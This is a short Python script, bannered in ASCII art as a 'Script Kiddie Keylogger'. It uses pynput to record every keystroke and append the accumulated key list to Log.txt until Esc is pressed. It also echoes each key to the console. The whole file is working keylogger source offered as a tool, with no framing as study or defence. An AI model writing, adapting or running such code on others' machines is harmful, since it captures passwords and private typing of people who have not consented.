import pynput
from pynput.keyboard import Key,Listener
print("     _____           _       _     _  ___     _     _ _         ")  
print("    / ____|         (_)     | |   | |/ (_)   | |   | (_)        ")  
print("  | (___   ___ _ __ _ _ __ | |_  | ' / _  __| | __| |_  ___  ___ ")
print("   \___ \ / __| '__| | '_ \| __| |  < | |/ _` |/ _` | |/ _ \/ _ \ ")
print("    ____) | (__| |  | | |_) | |_  | . \| | (_| | (_| | |  __/  __/")
print("   |_____/ \___|_|  |_| .__/ \__| |_|\_\_|\__,_|\__,_|_|\___|\___|")
print("    _  __          _  | |      ")                                   
print("   | |/ /         | | |_|     ")                                    
print("   | ' / ___ _   _| | ___   __ _  __ _  ___ _ __   ")               
print("   |  < / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|   ")              
print("   | . \  __/ |_| | | (_) | (_| | (_| |  __/ |        ")            
print("   |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_| ")                   
print("              __/ |         __/ | __/ |         ")                  
print("             |___/         |___/ |___/           ")                                                                   
count=0
keys=[]
def onPress(key):
    global keys,count
    keys.append(key)
    count +=1
    writeFile(str(keys))
    print("{0} pressed".format(key))
    
def onRelease(key):
    if key == Key.esc:
        return False

def writeFile(keys):
    with open("Log.txt","a") as f:
        for key in keys:
            f.write(key)
with Listener(on_press=onPress,on_release=onRelease) as listener:
    listener.join()
print(count)
